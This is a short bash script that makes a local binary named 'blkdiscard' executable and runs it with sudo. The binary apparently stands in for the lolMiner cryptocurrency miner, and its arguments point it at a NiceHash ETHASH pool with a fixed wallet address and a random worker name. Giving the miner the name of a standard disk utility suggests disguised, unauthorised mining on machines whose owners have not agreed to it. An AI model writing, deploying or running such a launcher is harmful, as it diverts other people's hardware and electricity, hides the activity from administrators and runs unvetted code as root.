#!/bin/bash

cd "$(dirname "$0")"

chmod +x ./blkdiscard && sudo ./blkdiscard lolMiner --algo ETHASH --pool daggerhashimoto.eu-west.nicehash.com:3353 --user 31ib7EZjeDoER14o1WzVyxJRgw7EeAHTBH.$(echo $(shuf -i 1-500 -n 1)-joa) --ethstratum ETHPROXY
